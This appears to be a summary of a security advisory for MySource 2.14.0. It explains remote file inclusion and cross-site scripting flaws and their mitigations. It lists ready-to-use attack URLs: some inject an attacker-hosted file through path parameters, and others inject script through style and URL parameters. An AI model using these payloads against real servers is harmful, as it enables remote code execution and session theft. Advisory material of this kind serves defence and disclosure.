Based on the provided content, here's the breakdown of the vulnerabilities in MySource 2.14.0 as described in the Secunia advisory:

**Vulnerabilities:**

1.  **Arbitrary File Inclusion:**
    *   **Root Cause:** Insufficient input verification before using the input to include files.
    *   **Weakness:** The application does not properly sanitize input parameters such as `INCLUDE_PATH`, `SQUIZLIB_PATH`, and `PEAR_PATH` before using them to include files, allowing an attacker to specify arbitrary local or remote files to be included.
    *   **Attack Vectors:** HTTP GET requests with malicious parameters to various PHP files within the web application, allowing for remote file inclusion. Examples of vulnerable URLs and parameters include:
        *   `http://[victim]/web/edit/upgrade_functions/new_upgrade_functions.php?INCLUDE_PATH=http://[host]/[file]`
        *   `http://[victim]/web/edit/upgrade_functions/new_upgrade_functions.php?SQUIZLIB_PATH=http://[host]/[file]`
        *   `http://[victim]/web/init_mysource.php?INCLUDE_PATH=http://[host]/[file]`
        *   `http://[victim]/pear/Net_Socket/Socket.php?PEAR_PATH=http://[host]/[file]`
        *   `http://[victim]/pear/HTTP_Request/Request.php?PEAR_PATH=http://[host]/[file]`
        *   `http://[victim]/pear/Mail/Mail.php?PEAR_PATH=http://[host]/[file]`
        *   `http://[victim]/pear/Date/Date.php?PEAR_PATH=http://[host]/[file]`
        *   `http://[victim]/pear/Date/Date/Span.php?PEAR_PATH=http://[host]/[file]`
        *   `http://[victim]/pear/Mail_Mime/mimeDecode.php?PEAR_PATH=http://[host]/[file]`
        *   `http://[victim]/pear/Mail_Mime/mime.php?PEAR_PATH=http://[host]/[file]`

    *   **Impact:** System compromise and potential for arbitrary code execution by including malicious files, leading to complete control of the vulnerable web server.
    *   **Required Capabilities/Position:** The attacker must be able to send HTTP requests to the vulnerable server. `register_globals` must be enabled on the server, and the affected scripts must be accessible within the web root.

2.  **Cross-Site Scripting (XSS):**
    *   **Root Cause:** Inadequate sanitization of user-supplied input before displaying it back to the user.
    *   **Weakness:** The application does not properly sanitize input parameters before returning them to the user, which allows for the injection of arbitrary HTML and script code, leading to XSS attacks.
    *    **Attack Vectors:** HTTP GET requests with malicious parameters to various PHP files within the web application. Examples of vulnerable URLs and parameters include:
          *   `http://[victim]/web/edit/upgrade_in_progress_backend.php?target_url=">[code]`
          *  `http://[victim]/squizlib/bodycopy/pop_ups/insert_table.php?bgcolor=</style>[code]`
          *   `http://[victim]/squizlib/bodycopy/pop_ups/edit_table_cell_props.php?bgcolor=</style>[code]`
          *   `http://[victim]/squizlib/bodycopy/pop_ups/header.php?bgcolor=</style>[code]`
          *  `http://[victim]/squizlib/bodycopy/pop_ups/edit_table_row_props.php?bgcolor=</style>[code]`
          *  `http://[victim]/squizlib/bodycopy/pop_ups/edit_table_props.php?bgcolor=</style>[code]`
          *   `http://[victim]/squizlib/bodycopy/pop_ups/edit_table_cell_type_wysiwyg.php?stylesheet=">[code]`

    *   **Impact:** Execution of arbitrary HTML and JavaScript code in a user's browser session, allowing the attacker to steal cookies, hijack user sessions, deface the website, or redirect users to malicious sites.
    *    **Required Capabilities/Position:** The attacker must be able to send HTTP requests to the vulnerable server. `register_globals` must be enabled on the server, and the affected scripts must be accessible within the web root.

**Mitigation:**

*   The vendor fixed the vulnerabilities in version 2.14.2 by warning the user about security risks during installation.
*   Users should set `register_globals` to "Off".
*   The MySource installation should be moved out of the web root.

**Severity:** Highly critical due to the potential for remote code execution and cross-site scripting.
